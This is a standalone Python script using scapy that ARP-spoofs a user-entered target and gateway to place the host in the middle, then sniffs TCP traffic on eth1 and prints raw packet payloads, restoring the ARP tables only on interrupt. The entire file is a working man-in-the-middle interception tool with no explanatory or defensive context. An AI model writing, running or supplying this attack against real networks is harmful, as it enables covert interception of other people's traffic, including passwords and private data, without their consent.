from scapy.all import *
import scapy.all as scapy
import time

interval = 4
ip_target = input("Enter target IP address: ")
ip_gateway = input("Enter gateway IP address: ")

def spoof(target_ip, spoof_ip):
    macAddr = scapy.getmacbyip(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = macAddr, psrc = spoof_ip)
    scapy.send(packet, verbose = False)
   
def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

try:
    while True:
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        print("capture started") # after a few seconds you should stop it

        capture = sniff(session=TCPSession, iface = "eth1")
        skip = False
        for x in capture:
            skip = not skip
            if skip == 1:
                continue

            if Raw in x:
                load = x[Raw].load
                print("load: ", load)

        print("end of sniff")
        time.sleep(interval)
except KeyboardInterrupt:
    restore(ip_gateway, ip_target)
    restore(ip_target, ip_gateway)
